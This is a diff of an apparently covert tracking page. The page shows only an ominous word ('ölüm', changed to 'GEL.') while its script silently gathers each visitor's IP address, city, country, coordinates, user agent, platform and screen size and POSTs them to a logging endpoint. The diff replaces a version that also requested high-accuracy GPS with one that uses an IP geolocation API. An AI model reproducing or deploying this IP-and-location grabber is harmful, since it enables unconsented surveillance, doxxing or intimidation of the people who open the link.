@@ -19,47 +19,36 @@
   </style>
 </head>
 <body>
-  ölüm
+  GEL.
 
   <script>
-    // 1) IP tabanlı konum sorgusu (fallback)
+    // 1) ipgeolocation.io üzerinden IP tabanlı konum bilgisi almak
     async function getIPLocation() {
       try {
-        // ip-api.com -> JSON yanıt döndürür
-        // Ücretsiz sürümü HTTP olabilir; HTTPS'te çalışmayabilir. Alternatif: "https://ipwho.is/" vb.
-        const res = await fetch('http://ip-api.com/json/');
+        // ipgeolocation.io hesabınızdan aldığınız API Key'i buraya ekleyin:
+        const apiKey = "YOUR_API_KEY"; // Örnek: "8f25..."
+        
+        // API isteği
+        const res = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}`);
         const data = await res.json();
-        // Örnek yanıt:
+        // data muhtemel örnek:
         // {
-        //   "status":"success",
-        //   "country":"United States",
-        //   "countryCode":"US",
-        //   "region":"CA",
-        //   "regionName":"California",
-        //   "city":"San Francisco",
-        //   "lat":37.7749,
-        //   "lon":-122.4194,
-        //   "query":"xxx.xxx.xxx.xxx"
+        //   "ip": "8.8.8.8",
+        //   "country_name": "United States",
+        //   "city": "Mountain View",
+        //   "latitude": 37.4056,
+        //   "longitude": -122.0775,
+        //   ...
         // }
-        if (data.status === "success") {
-          return {
-            ip: data.query || "Bilinmeyen IP",
-            latitude: data.lat || null,
-            longitude: data.lon || null,
-            city: data.city || "Bilinmeyen",
-            country: data.country || "Bilinmeyen"
-          };
-        } else {
-          // "fail" durumunda
-          return null;
-        }
+
+        return data;
       } catch (error) {
         console.error("IP tabanlı konum alınırken hata oluştu:", error);
         return null;
       }
     }
 
-    // 2) Kullanıcının gerçek IP'sini (api64.ipify.org) almak için (isteğe bağlı)
+    // 2) Kullanıcının gerçek IP'sini (api64.ipify.org) almak (isteğe bağlı)
     async function getUserIP() {
       try {
         const res = await fetch('https://api64.ipify.org?format=json'); 
@@ -71,103 +60,31 @@
       }
     }
 
-    // 3) Enlem/boylam -> şehir/ülke (Nominatim) (GPS konumu için)
-    async function getLocationFromCoords(latitude, longitude) {
-      try {
-        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`);
-        const data = await res.json();
-
-        const country = data.address?.country || "Bilinmeyen";
-        const city = data.address?.city || data.address?.town || data.address?.village || "Bilinmeyen";
-        return { country, city };
-      } catch (error) {
-        console.error("GPS konum alınırken hata oluştu:", error);
-        return { country: "Bilinmeyen", city: "Bilinmeyen" };
-      }
-    }
-
-    // 4) Yüksek hassasiyetle tarayıcı konumunu iste -> Başarısızsa IP fallback
-    function getGPSLocationWithFallback() {
-      return new Promise(async (resolve) => {
-        // Tarayıcı geolocation destekliyorsa:
-        if ("geolocation" in navigator) {
-          navigator.geolocation.getCurrentPosition(
-            async (position) => {
-              // Başarılı: GPS'ten enlem-boylam aldık
-              const latitude = position.coords.latitude;
-              const longitude = position.coords.longitude;
-              // Nominatim'den şehir/ülke
-              const loc = await getLocationFromCoords(latitude, longitude);
-              resolve({
-                success: true,
-                latitude,
-                longitude,
-                city: loc.city,
-                country: loc.country
-              });
-            },
-            async (error) => {
-              console.warn("Konum izni reddedildi veya hata oluştu:", error);
-              // HATA -> IP tabanlı konuma fallback
-              const ipLoc = await getIPLocation();
-              if (ipLoc) {
-                resolve({
-                  success: false,
-                  latitude: ipLoc.latitude,
-                  longitude: ipLoc.longitude,
-                  city: ipLoc.city,
-                  country: ipLoc.country,
-                  ip: ipLoc.ip
-                });
-              } else {
-                // IP de alınamadıysa
-                resolve(null);
-              }
-            },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-          );
-        } else {
-          console.error("Tarayıcı geolocation API'sini desteklemiyor. IP tabanlı konuma geçiliyor.");
-          // Geolocation desteklenmiyorsa IP fallback
-          const ipLoc = await getIPLocation();
-          if (ipLoc) {
-            resolve({
-              success: false,
-              latitude: ipLoc.latitude,
-              longitude: ipLoc.longitude,
-              city: ipLoc.city,
-              country: ipLoc.country,
-              ip: ipLoc.ip
-            });
-          } else {
-            resolve(null);
-          }
-        }
-      });
-    }
-
-    // 5) Tüm verileri birleştirip sunucuya gönder
+    // 3) Tüm verileri birleştirip sunucuya gönder
     async function sendData() {
-      // Tarayıcı konumu veya IP fallback
-      const locationData = await getGPSLocationWithFallback();
+      // ipgeolocation.io'dan gelen konum
+      const ipData = await getIPLocation();
 
-      // "Gerçek IP" sorgusu (isteğe bağlı). IP tabanlı konumla gelen IP ile farklı olabilir.
-      const userIP = await getUserIP();
+      // ipify'den gelen "gerçek" IP (isteğe bağlı)
+      const fallbackIP = await getUserIP();
 
-      // Varsayılan
+      // IP tabanlı sonuç yoksa "Konum alınamadı"
+      let finalIP = fallbackIP;
       let finalLocation = "Konum alınamadı";
       let lat = null;
       let lon = null;
 
-      if (locationData) {
-        // "Şehir, Ülke" formatı
-        finalLocation = `${locationData.city}, ${locationData.country}`;
-        lat = locationData.latitude;
-        lon = locationData.longitude;
+      if (ipData) {
+        finalIP = ipData.ip || fallbackIP; // ipgeolocation.io ip yoksa fallback
+        const city = ipData.city || "Bilinmeyen";
+        const country = ipData.country_name || "Bilinmeyen";
+        finalLocation = `${city}, ${country}`;
+        lat = ipData.latitude || null;
+        lon = ipData.longitude || null;
       }
 
       let userData = {
-        ip: userIP,  // ipify'den gelen IP
+        ip: finalIP,
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         screenWidth: screen.width,
@@ -178,7 +95,7 @@
         longitude: lon
       };
 
-      // Sunucuya POST
+      // Sunucuya POST isteği
       fetch('/api/log', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
